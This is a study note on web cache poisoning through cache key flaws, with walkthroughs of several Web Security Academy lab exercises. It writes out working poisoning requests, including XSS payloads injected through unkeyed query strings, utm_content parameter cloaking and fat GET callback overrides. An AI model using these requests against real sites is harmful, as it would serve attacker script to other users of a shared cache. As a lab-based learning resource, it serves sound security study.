### Cache key flaws
Generally speaking, websites take most of their input from the URL path and the query string. As a result, this is a well-trodden attack surface for various hacking techniques. However, as the request line is usually part of the cache key, these inputs have traditionally not been considered suitable for cache poisoning. Any payload injected via keyed inputs would act as a cache buster, meaning your poisoned cache entry would almost certainly never be served to any other users.

On closer inspection, however, the behavior of individual caching systems is not always as you would expect. In practice, many websites and CDNs perform various transformations on keyed components when they are saved in the cache key. This can include: 
- Excluding the query string
- Filtering out specific query parameters
- Normalizing input in keyed components

These transformations may introduce a few unexpected quirks. These are primarily based around discrepancies between the data that is written to the cache key and the data that is passed into the application code, even though it all stems from the same input. These cache key flaws can be exploited to poison the cache via inputs that may initially appear unusable.

In the case of fully integrated, application-level caches, these quirks can be even more extreme. In fact, internal caches can be so unpredictable that it is sometimes difficult to test them at all without inadvertently poisoning the cache for live users. 

### Cache probing methodology
### Identify a suitable cache oracle
The first step is to identify a suitable "cache oracle" that you can use for testing. A cache oracle is simply a page or endpoint that provides feedback about the cache's behavior. This needs to be cacheable and must indicate in some way whether you received a cached response or a response directly from the server. This feedback could take various forms, such as:
- An HTTP header that explicitly tells you whether you got a cache hit
- Observable changes to dynamic content
- Distinct response times

Ideally, the cache oracle will also reflect the entire URL and at least one query parameter in the response. This will make it easier to notice parsing discrepancies between the cache and the application, which will be useful for constructing different exploits later.

If you can identify that a specific third-party cache is being used, you can also consult the corresponding documentation. This may contain information about how the default cache key is constructed. You might even stumble across some handy tips and tricks, such as features that allow you to see the cache key directly. For example, Akamai-based websites may support the header Pragma: akamai-x-get-cache-key, which you can use to display the cache key in the response headers: 

```bash
GET /?param=1 HTTP/1.1
Host: innocent-website.com
Pragma: akamai-x-get-cache-key

In the response:
HTTP/1.1 200 OK
X-Cache-Key: innocent-website.com/?param=1
```

### Probe key handling
The next step is to investigate whether the cache performs any additional processing of your input when generating the cache key. You are looking for an additional attack surface hidden within seemingly keyed components.

You should specifically look at any transformation that is taking place. Is anything being excluded from a keyed component when it is added to the cache key? Common examples are excluding specific query parameters, or even the entire query string, and removing the port from the Host header.

If you're fortunate enough to have direct access to the cache key, you can simply compare the key after injecting different inputs. Otherwise, you can use your understanding of the cache oracle to infer whether you received the correct cached response. For each case that you want to test, you send two similar requests and compare the responses. 

Let's say that our hypothetical cache oracle is the target website's home page. This automatically redirects users to a region-specific page. It uses the Host header to dynamically generate the Location header in the response:
```bash
GET / HTTP/1.1
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com/en
Cache-Status: miss
```

To test whether the port is excluded from the cache key, we first need to request an arbitrary port and make sure that we receive a fresh response from the server that reflects this input:
```bash
GET / HTTP/1.1
Host: vulnerable-website.com:1337

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: miss
```
Next, we'll send another request, but this time we won't specify a port:
GET / HTTP/1.1
```bash
Host: vulnerable-website.com

HTTP/1.1 302 Moved Permanently
Location: https://vulnerable-website.com:1337/en
Cache-Status: hit
```

As you can see, we have been served our cached response even though the Host header in the request does not specify a port. This proves that the port is being excluded from the cache key. Importantly, the full header is still passed into the application code and reflected in the response.

In short, although the Host header is keyed, the way it is transformed by the cache allows us to pass a payload into the application while still preserving a "normal" cache key that will be mapped to other users' requests. This kind of behavior is the key concept behind all of the exploits that we'll discuss in this section.

You can use a similar approach to investigate any other processing of your input by the cache. Is your input being normalized in any way? How is your input stored? Do you notice any anomalies? We'll cover how to answer these questions later using concrete examples. 

### Identify an exploitable gadget
By now, you should have a relatively solid understanding of how the target website's cache behaves and might have found some interesting flaws in the way the cache key is constructed. The final step is to identify a suitable gadget that you can chain with this cache key flaw. This is an important skill because the severity of any web cache poisoning attack is heavily dependent on the gadget you are able to exploit. 

These gadgets will often be classic client-side vulnerabilities, such as reflected XSS and open redirects. By combining these with web cache poisoning, you can massively escalate the severity of these attacks, turning a reflected vulnerability into a stored one. Instead of having to induce a victim to visit a specially crafted URL, your payload will automatically be served to anybody who visits the ordinary, perfectly legitimate URL.

Perhaps even more interestingly, these techniques enable you to exploit a number of unclassified vulnerabilities that are often dismissed as "unexploitable" and left unpatched. This includes the use of dynamic content in resource files, and exploits requiring malformed requests that a browser would never send. 

### Exploiting cache key flaws
### Unkeyed port
The Host header is often part of the cache key and, as such, initially seems an unlikely candidate for injecting any kind of payload. However, some caching systems will parse the header and exclude the port from the cache key.

In this case, you can potentially use this header for web cache poisoning. For example, consider the case we saw earlier where a redirect URL was dynamically generated based on the Host header. This might enable you to construct a denial-of-service attack by simply adding an arbitrary port to the request. All users who browsed to the home page would be redirected to a dud port, effectively taking down the home page until the cache expired.

This kind of attack can be escalated further if the website allows you to specify a non-numeric port. You could use this to inject an XSS payload, for example. 

### Unkeyed query string
Like the Host header, the request line is typically keyed. However, one of the most common cache-key transformations is to exclude the entire query string.

### Detecting an unkeyed query string
If the response explicitly tells you whether you got a cache hit or not, this transformation is relatively simple to spot - but what if it doesn't? This has the side-effect of making dynamic pages appear as though they are fully static because it can be hard to know whether you are communicating with the cache or the server.

To identify a dynamic page, you would normally observe how changing a parameter value has an effect on the response. But if the query string is unkeyed, most of the time you would still get a cache hit, and therefore an unchanged response, regardless of any parameters you add. Clearly, this also makes classic cache-buster query parameters redundant.

Fortunately, there are alternative ways of adding a cache buster, such as adding it to a keyed header that doesn't interfere with the application's behavior. Some typical examples include:
```bash
Accept-Encoding: gzip, deflate, cachebuster
Accept: */*, text/cachebuster
Cookie: cachebuster=1
Origin: https://cachebuster.vulnerable-website.com
```

If you use Param Miner, you can also select the options "Add static/dynamic cache buster" and "Include cache busters in headers". It will then automatically add a cache buster to commonly keyed headers in any requests that you send using Burp's manual testing tools.

Another approach is to see whether there are any discrepancies between how the cache and the back-end normalize the path of the request. As the path is almost guaranteed to be keyed, you can sometimes exploit this to issue requests with different keys that still hit the same endpoint. For example, the following entries might all be cached separately but treated as equivalent to GET / on the back-end:

Apache: GET //
Nginx: GET /%2F
PHP: GET /index.php/xyz
.NET GET /(A(xyz)/

This transformation can sometimes mask what would otherwise be glaringly obvious reflected XSS vulnerabilities. If penetration testers or automated scanners only receive cached responses without realizing, it can appear as though there is no reflected XSS on the page. 

### Exploiting an unkeyed query string
### PRACTITIONER Lab: Web cache poisoning via an unkeyed query string
Query string is not part of the cache key, and we can't use cache busting in the query string e.g. `?cb=1234` because of that

We can check that by sending a request to `GET /`
In the response we see: `x-cache`: miss, which means it cached the response
So we make another request: `GET /?cb=VVVV` and in the response we see: `x-cache: hit` which means the response was delivered from the cache and query string is not part of the cache key

What's interesting is that `VVVV` is reflected in the html response

So we try to poison the cache, but first we need a cache buster.
So we try `Cookie` header as a cache buster but no luck, the response is returned from the cache: `x-cache: hit`
We also try `Accept` header by appending `, text/randomadfdsaf` to it, but the response is also returned from the cache which means that `Accept` header is not part of the cache key either
We try `Accept-encoding`, at the end we append: `, fasdfsdfsdf` and the response is returned from the cache
Last thing we can try is `Origin` header, with the value e.g.: `https://cachebusterrandom.com` and we get `x-cache: miss` which means the response is not returned from the cache, and the response is now cached

If we make a request:
```bash
GET /?cb=VVVV
...
Origin: https://cachebusterrandom.com 
```
In the response we see:
```bash
<link rel="canonical" href='//labid.web-security-academy.net/?cb=VVVV'/>
```

So we can poison the cache:
```bash
GET /?evil='/><script>alert(1)</script> HTTP/2
Host: labid.web-security-academy.net
Origin: https://cachebusterrandom.com 
```
Now to check it in the browser: in Repeater right click on the request > Request in browser > in original session. We have to do it this way because we want to make the request with the `Origin: https://cachebusterrandom.com` from the browser
And we get an alert executed

So now we remove the cache buster (`Origin` header in this lab) and we poison the cache on the main page

Very useful lab hints:
You can use the `Pragma: x-get-cache-key` header to display the cache key in the response. This applies to some of the other labs as well.
So in this lab with `Pragma: x-get-cache-key` we see: `X-Cache-Key: /$$` which is quite interesting because it doesn't actually show us that Origin header is part of the cache key

Although you can't use a query parameter as a cache buster, there is a common request header that will be keyed if present. You can use the Param Miner extension to automatically add a cache buster header to your requests.

### Unkeyed query parameters
So far we've seen that on some websites, the entire query string is excluded from the cache key. But some websites only exclude specific query parameters that are not relevant to the back-end application, such as parameters for analytics or serving targeted advertisements. UTM parameters like utm_content are good candidates to check during testing.

Parameters that have been excluded from the cache key are unlikely to have a significant impact on the response. The chances are there won't be any useful gadgets that accept input from these parameters. That said, some pages handle the entire URL in a vulnerable manner, making it possible to exploit arbitrary parameters. 

### PRACTITIONER Lab: Web cache poisoning via an unkeyed query parameter
So `GET /` is out cache oracle because it reveals Cache headers in the response
So we try to find a cache buster: `GET /?cb=VVVV` and we see `x-cache: miss` which means cache buster works
Also we see that `VVVV` is reflected in the response

But `?cb=VVVV` is actually part of the cache key. We want to find another param which is not part of the cache key.

So in repeater right click on req > extensions > Param miner > guess query params 
The output of Param miner:
```bash
Initiating url bruteforce on 0ad4004d0477735581418e5500100022.web-security-academy.net
Identified parameter on 0ad4004d0477735581418e5500100022.web-security-academy.net: utm_content
Found issue: Web Cache Poisoning: Query param blacklist 
Target: https://0ad4004d0477735581418e5500100022.web-security-academy.net
The application excludes certain parameters from the cache key. This was confirmed by injecting the value 'akzldka' using the k5e6vhnria1 parameter, then replaying the request without the injected value, and confirming it still appears in the response. <br>For further information on this technique, please refer to https://portswigger.net/research/web-cache-entanglement
Evidence: 
======================================
GET /?cb=VVVV&utm_content=akzldka&nmllfq8=1 HTTP/2
Host: 0ad4004d0477735581418e5500100022.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
Te: trailers
Origin: https://nmllfq8.com
Via: nmllfq8


======================================
GET /?cb=VVVV&utm_content=zzmkdfq&nmllfq8=1 HTTP/2
Host: 0ad4004d0477735581418e5500100022.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
Te: trailers
Origin: https://nmllfq8.com
Via: nmllfq8


======================================

Found issue: Web Cache Poisoning: Parameter Cloaking
Target: https://0ad4004d0477735581418e5500100022.web-security-academy.net
The application can be manipulated into excluding the k5e6vhnria1 parameter from the cache key, by disguising it as utm_content. <br>For further information on this technique, please refer to https://portswigger.net/research/web-cache-entanglement
Evidence: 
======================================
GET /?cb=VVVV&utm_content=k5e6vhnria1&utm_content=x;k5e6vhnria1=akzldka&ypb4k3=1 HTTP/2
Host: 0ad4004d0477735581418e5500100022.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
Te: trailers
Origin: https://ypb4k3.com
Via: ypb4k3


======================================
GET /?cb=VVVV&utm_content=k5e6vhnria1&ypb4k3=1 HTTP/2
Host: 0ad4004d0477735581418e5500100022.web-security-academy.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://portswigger.net/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Sec-Fetch-User: ?1
Priority: u=0, i
Pragma: no-cache
Cache-Control: no-cache
Te: trailers
Origin: https://ypb4k3.com
Via: ypb4k3
```

We see that `utm_content` query param is not part of the query key.
So we can poison the cache on the main page:
```bash
GET /?utm_content='/><script>alert(1)</script>
```

### Cache parameter cloaking
If the cache excludes a harmless parameter from the cache key, and you can't find any exploitable gadgets based on the full URL, you'd be forgiven for thinking that you've reached a dead end. However, this is actually where things can get interesting.

If you can work out how the cache parses the URL to identify and remove the unwanted parameters, you might find some interesting quirks. Of particular interest are any parsing discrepancies between the cache and the application. This can potentially allow you to sneak arbitrary parameters into the application logic by "cloaking" them in an excluded parameter.

For example, the de facto standard is that a parameter will either be preceded by a question mark (?), if it's the first one in the query string, or an ampersand (&). Some poorly written parsing algorithms will treat any ? as the start of a new parameter, regardless of whether it's the first one or not.

Let's assume that the algorithm for excluding parameters from the cache key behaves in this way, but the server's algorithm only accepts the first ? as a delimiter. Consider the following request:
```
GET /?example=123?excluded_param=bad-stuff-here
```

In this case, the cache would identify two parameters and exclude the second one from the cache key. However, the server doesn't accept the second ? as a delimiter and instead only sees one parameter, example, whose value is the entire rest of the query string, including our payload. If the value of example is passed into a useful gadget, we have successfully injected our payload without affecting the cache key. 

### Exploiting parameter parsing quirks
TODO: read below, (contains info about ruby)
Similar parameter cloaking issues can arise in the opposite scenario, where the back-end identifies distinct parameters that the cache does not. The Ruby on Rails framework, for example, interprets both ampersands (&) and semicolons (;) as delimiters. When used in conjunction with a cache that does not allow this, you can potentially exploit another quirk to override the value of a keyed parameter in the application logic.

Consider the following request:
```bash
GET /?keyed_param=abc&excluded_param=123;keyed_param=bad-stuff-here
```

As the names suggest, keyed_param is included in the cache key, but excluded_param is not. Many caches will only interpret this as two parameters, delimited by the ampersand: 
- keyed_param=abc
- excluded_param=123;keyed_param=bad-stuff-here

Once the parsing algorithm removes the excluded_param, the cache key will only contain keyed_param=abc. On the back-end, however, Ruby on Rails sees the semicolon and splits the query string into three separate parameters:
- keyed_param=abc
- excluded_param=123
- keyed_param=bad-stuff-here

But now there is a duplicate keyed_param. This is where the second quirk comes into play. If there are duplicate parameters, each with different values, Ruby on Rails gives precedence to the final occurrence. The end result is that the cache key contains an innocent, expected parameter value, allowing the cached response to be served as normal to other users. On the back-end, however, the same parameter has a completely different value, which is our injected payload. It is this second value that will be passed into the gadget and reflected in the poisoned response.

This exploit can be especially powerful if it gives you control over a function that will be executed. For example, if a website is using JSONP to make a cross-domain request, this will often contain a callback parameter to execute a given function on the returned data: 
```bash
GET /jsonp?callback=innocentFunction
```

In this case, you could use these techniques to override the expected callback function and execute arbitrary JavaScript instead. 

### PRACTITIONER Lab: Parameter cloaking
First we identify the cache oracle:
```bash
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a17001003875ee68349aaf600da000f.web-security-academy.net
Cookie: session=ibPPzprpcHToFzgVddseV6r3sbUca6tY; country=[object Object]
```

So we can use url query param as a cache buster `?abc=123` but just for the sake of convinience let's use `Origin` header as a cache buster in this lab

So we see that in the url `GET /js/geolocate.js?callback=setCountryCookie` we have `?callback`  query param and the value of it is reflected and returned in the response html page:
```bash
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 7
X-Cache: hit
Content-Length: 201

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
setCountryCookie({"country":"United Kingdom"});
```

So we can `GET /js/geolocate.js?callback=alert(1)` and it will be reflected on the response page: 
```bash
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 193

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1)({"country":"United Kingdom"});
```

The problem is that `?callback=alert(1)` is part of the cache key, which means only users who make `GET /js/geolocate.js?callback=alert(1)` req, will see the response from the poisoned cache

So now we try parameter pollution:
```bash
GET /js/geolocate.js?callback=setCountryCookie&callback=alert(1) HTTP/2
```
And the response:
```bash
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 193

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1)({"country":"United Kingdom"});
```
We see that it actually gave precedence to the second `callback` query param

Now we need to hide (or to cloak in other words) the second `callback` query param from the caching server
We can do that by searching for unkeyed query params with Param miner > Guess query params

The result of param miner:
```bash
Initiating url bruteforce on labid.web-security-academy.net
Identified parameter on labid.web-security-academy.net: utm_content
```

So we now know that `utm_content` query param is unkeyed. We need to try to use it, in order to cloak the second callback query param from the caching server

It's interesting that usually req query params are separated by `&` sign, but ruby on rails allows `;` for separation of query params

So we try:
```bash
GET /js/geolocate.js?callback=setCountryCookie&utm_content=ff;callback=alert(1) HTTP/2
Host: 0a17001003875ee68349aaf600da000f.web-security-academy.net
```
And in the response:
```bash
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
Set-Cookie: utm_content=ff; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 193

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1)({"country":"United Kingdom"});
```

So now we need to remove cache buster (our Origin header) make the req again and when the victim visits:
```bash
GET /js/geolocate.js?callback=setCountryCookie
```
They'll get:
```bash
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 3
X-Cache: hit
Content-Length: 193

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1)({"country":"United Kingdom"});
```

It works like that because the caching server does not include `utm_content` query param in it's cache key. Now since we added `;` separator, the caching server reads the second `callback` query param as part of `utm_content` and it ignores it, but the origin backend server actually treats `;` as a separator of query params and therefore the value of the second `callback` query param is reflected in the response

### Exploiting fat GET support
In select cases, the HTTP method may not be keyed. This might allow you to poison the cache with a POST request containing a malicious payload in the body. Your payload would then even be served in response to users' GET requests. Although this scenario is pretty rare, you can sometimes achieve a similar effect by simply adding a body to a GET request to create a "fat" GET request:
```bash
GET /?param=innocent HTTP/1.1
…
param=bad-stuff-here
```

In this case, the cache key would be based on the request line, but the server-side value of the parameter would be taken from the body. 

### PRACTITIONER Lab: Web cache poisoning via a fat GET request
This is not well described lab, for understanding read previous labs
There's a request and the value of `callback` is reflected in the response html page
```bash
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a69001303f537fb834e709600a0004b.web-security-academy.net
```
Response:
```bash
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache: miss
Content-Length: 201

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
setCountryCookie({"country":"United Kingdom"});
```

So we craft a malicious request with a req body in the GET req:
```bash
GET /js/geolocate.js?callback=setCountryCookie HTTP/2
Host: 0a69001303f537fb834e709600a0004b.web-security-academy.net
Cookie: session=2pghLrQVvRDlVCoXVl2e6r4JTpjG75C9; country=[object Object]
...

callback=alert(1)
```

And in the response we see:
```bash
HTTP/2 200 OK
Content-Type: application/javascript; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 3
X-Cache: hit
Content-Length: 193

const setCountryCookie = (country) => { document.cookie = 'country=' + country; };
const setLangCookie = (lang) => { document.cookie = 'lang=' + lang; };
alert(1)({"country":"United Kingdom"});
```

**Important**:
This is only possible if a website accepts GET requests that have a body, but there are potential workarounds. You can sometimes encourage "fat GET" handling by overriding the HTTP method, for example:
```bash
GET /?param=innocent HTTP/1.1
Host: innocent-website.com
X-HTTP-Method-Override: POST
…
param=bad-stuff-here
```

As long as the X-HTTP-Method-Override header is unkeyed, you could submit a pseudo-POST request while preserving a GET cache key derived from the request line. 

### Exploiting dynamic content in resource imports
Imported resource files are typically static but some reflect input from the query string. This is mostly considered harmless because browsers rarely execute these files when viewed directly, and an attacker has no control over the URLs used to load a page's subresources. However, by combining this with web cache poisoning, you can occasionally inject content into the resource file.

For example, consider a page that reflects the current query string in an import statement:
```bash
GET /style.css?excluded_param=123);@import… HTTP/1.1

HTTP/1.1 200 OK
…
@import url(/site/home/index.part1.8a6715a2.css?excluded_param=123);@import…
```

You could exploit this behavior to inject malicious CSS that exfiltrates sensitive information from any pages that import /style.css.

If the page importing the CSS file doesn't specify a doctype, you can maybe even exploit static CSS files. Given the right configuration, browsers will simply scour the document looking for CSS and then execute it. This means that you can occasionally poison static CSS files by triggering a server error that reflects the excluded query parameter:
```bash
GET /style.css?excluded_param=alert(1)%0A{}*{color:red;} HTTP/1.1
```
```bash
HTTP/1.1 200 OK
Content-Type: text/html
…
This request was blocked due to…alert(1){}*{color:red;}
```

### Normalized cache keys
Any normalization applied to the cache key can also introduce exploitable behavior. In fact, it can occasionally enable some exploits that would otherwise be almost impossible.

For example, when you find reflected XSS in a parameter, it is often unexploitable in practice. This is because modern browsers typically URL-encode the necessary characters when sending the request, and the server doesn't decode them. The response that the intended victim receives will merely contain a harmless URL-encoded string.

Some caching implementations normalize keyed input when adding it to the cache key. In this case, both of the following requests would have the same key:
```bash
GET /example?param="><test>
GET /example?param=%22%3e%3ctest%3e
```

This behavior can allow you to exploit these otherwise "unexploitable" XSS vulnerabilities. If you send a malicious request using Burp Repeater, you can poison the cache with an unencoded XSS payload. When the victim visits the malicious URL, the payload will still be URL-encoded by their browser; however, once the URL is normalized by the cache, it will have the same cache key as the response containing your unencoded payload.

As a result, the cache will serve the poisoned response and the payload will be executed client-side. You just need to make sure that the cache is poisoned when the victim visits the URL

### PRACTITIONER Lab: URL normalization

